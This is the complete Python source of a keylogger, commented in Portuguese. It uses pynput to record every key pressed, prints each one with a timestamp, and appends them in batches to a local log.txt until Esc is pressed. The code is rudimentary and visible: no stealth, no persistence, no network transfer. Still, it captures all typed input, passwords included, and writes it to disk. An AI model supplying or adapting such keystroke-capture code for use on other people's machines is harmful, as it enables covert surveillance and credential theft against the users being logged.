# coding=utf-8
import pynput
import re

from pynput.keyboard import Key, Listener
import time

count = 0
keys = []

# Para retirar o 'u' no começa do registro da Key
def lreplace(pattern, sub, string):
    return re.sub('^%s' % pattern, sub, string)


def convertstr(key):
    return lreplace("u", "", str(key)).replace("Key.", "")


def press(key):
    global keys, count
    keys.append(key)
    count += 1
    t = time.localtime()
    current_time = time.strftime("%H:%M:%S", t)
    print(current_time + ": Tecla " + convertstr(key) + " foi pressionada ")

    if count >= 10:
        write_file(keys)
        keys = []
        count = 0


def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            t = time.localtime()
            current_time = time.strftime("%H:%M:%S", t)
            f.write(current_time + ": Tecla " + convertstr(key) + " foi pressionada \n")


def release(key):
    if key == Key.esc:
        return False


with Listener(on_press=press, on_release=release) as listener:
    listener.join()
